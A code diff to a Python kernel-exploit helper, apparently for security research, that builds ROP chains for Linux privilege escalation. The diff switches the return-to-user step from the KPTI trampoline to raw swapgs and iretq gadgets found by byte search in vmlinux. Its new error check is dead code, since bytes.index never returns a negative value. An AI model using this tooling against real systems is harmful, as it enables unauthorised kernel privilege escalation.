@@ -23,6 +23,7 @@ import os
 
 import angr
 import angrop
+from elftools.elf.elffile import ELFFile
 from angrop.rop_gadget import RopGadget
 from rop_instruction_patcher import RopInstructionPatcher
 from rop_util import load_symbols, setup_logger
@@ -40,10 +41,13 @@ INIT_TASK = "init_task"
 FIND_TASK_BY_VPID = "find_task_by_vpid"
 SWITCH_TASK_NAMESPACES = "switch_task_namespaces"
 PARSE_MOUNT_OPTIONS = "parse_mount_options"
-KPTI_TRAMPOLINE = "swapgs_restore_regs_and_return_to_usermode"
 INIT_NSPROXY = "init_nsproxy"
 CORE_PATTERN = "core_pattern"
 CORE_PATTERN_SIZE = 0x80
+# it only exists with the ret after running the rop patcher to replace return thunks
+SWAPGS_RET_BYTES = b"\x0F\x01\xF8\xC3"
+IRETQ_BYTES = b"\x48\xCF"
+
 MSLEEP = "msleep"
 FORK = "__do_sys_fork"
 RPP_CONTEXT_SIZE = 5
@@ -95,7 +99,6 @@ class RopGeneratorAngrop:
         self._project.loader.main_object.mapped_base = (
             self._project.loader.main_object.segments[0].vaddr
         )
-        self._kpti_trampoline = self._find_kpti_trampoline()
         self._rop = self._load_angrop()
 
     def _find_symbol_addr(self, func_name):
@@ -163,6 +166,20 @@ class RopGeneratorAngrop:
             raise RopGeneratorError(
                 f"No pop gadget found for the register {reg_name}"
             )
+
+    def _find_gadget_by_bytes(self, gadget_bytes):
+        with open(self._vmlinux_path, 'rb') as f:
+            elffile = ELFFile(f)
+            text_section = elffile.get_section_by_name('.text')
+            text_section_base = text_section['sh_addr']
+            text_section_data = text_section.data()
+
+            offset = text_section_data.index(gadget_bytes)
+
+            if offset < 0:
+                raise RopGeneratorError("Unable to find gadget bytes")
+
+            return text_section_base + offset
 
     def mov_reg_memory_writes(self):
         """
@@ -292,36 +309,9 @@ class RopGeneratorAngrop:
         chain += self._rop.func_call(
             self._find_symbol_addr(SWITCH_TASK_NAMESPACES), []
         )
-        chain.add_gadget(RopGadget(self._kpti_trampoline))
-        chain.add_value(0)
-        chain.add_value(0)
+        chain.add_gadget(RopGadget(self._find_gadget_by_bytes(SWAPGS_RET_BYTES)))
+        chain.add_gadget(RopGadget(self._find_gadget_by_bytes(IRETQ_BYTES)))
         return chain
-
-    def _find_kpti_trampoline(self):
-        """Finds the address of the kPTI trampoline.
-
-        Returns:
-          The address of the kPTI trampoline.
-        """
-
-        target_addr = self._find_symbol_addr(KPTI_TRAMPOLINE)
-
-        # step at most 8 times
-        for _ in range(8):
-            target_block = self._project.factory.block(target_addr)
-            for ins in target_block.disassembly.insns:
-                if ins.mnemonic == "mov" and "rdi, rsp" in ins.op_str:
-                    # add to symbol map
-                    self._symbol_map["kpti_trampoline"] = ins.address
-                    self._addr_to_symbol[ins.address] = "kpti_trampoline"
-                    return ins.address
-            if target_block.size == 0:
-                target_addr += 1
-            else:
-                target_addr = target_addr+target_block.size
-
-
-        raise RuntimeError("didn't find kpti_trampoline")
 
     def payload_c_code(self, rop_chain, print_instructions=True):
         """Prints the C code for the ROP chain.
@@ -438,7 +428,7 @@ class RopGeneratorAngrop:
           description="switch_task_namespaces(find_task_by_vpid(ARG_vpid), init_nsproxy)",
           gadgets=items)
 
-    def rop_action_ret_via_kpti_retpoline(
+    def rop_action_ret2user(
         self,
         user_rip: RopChainArgument,
         user_cs: RopChainArgument,
@@ -446,19 +436,24 @@ class RopGeneratorAngrop:
         user_sp: RopChainArgument,
         user_ss: RopChainArgument,
     ):
-        """Constructs a kpti trampoline rop chain.
+        """Constructs a rop action to return to user using swapgs and iretq.
 
         Returns:
             RopChain: The constructed ROP chain.
         """
+
+        swapgs_ret = self._find_gadget_by_bytes(SWAPGS_RET_BYTES)
+        iretq = self._find_gadget_by_bytes(IRETQ_BYTES)
+
         return RopAction(
-          description="ret_via_kpti_retpoline(ARG_user_rip, ARG_user_cs, ARG_user_rflags, ARG_user_sp, ARG_user_ss)",
+          description="ret2user(ARG_user_rip, ARG_user_cs, ARG_user_rflags, ARG_user_sp, ARG_user_ss)",
           gadgets=[
             RopChainOffset(
-              kernel_offset=self._kpti_trampoline - KERNEL_BASE_ADDRESS,
-              description="kpti_trampoline()"),
-            RopChainConstant(0),
-            RopChainConstant(0),
+              kernel_offset=swapgs_ret - KERNEL_BASE_ADDRESS,
+              description="swapgs_ret"),
+            RopChainOffset(
+              kernel_offset=iretq - KERNEL_BASE_ADDRESS,
+              description="iretq"),
             user_rip,
             user_cs,
             user_rflags,
@@ -538,7 +533,7 @@ if __name__ == "__main__":
         RopChainArgument(0), RopChainArgument(1))
     action_fork = rop_generator.rop_action_fork()
     action_telefork = rop_generator.rop_action_telefork(RopChainArgument(0))
-    action_trampoline_ret = rop_generator.rop_action_ret_via_kpti_retpoline(
+    action_trampoline_ret = rop_generator.rop_action_ret2user(
       RopChainArgument(0), RopChainArgument(1), RopChainArgument(2),
       RopChainArgument(3), RopChainArgument(4))
 
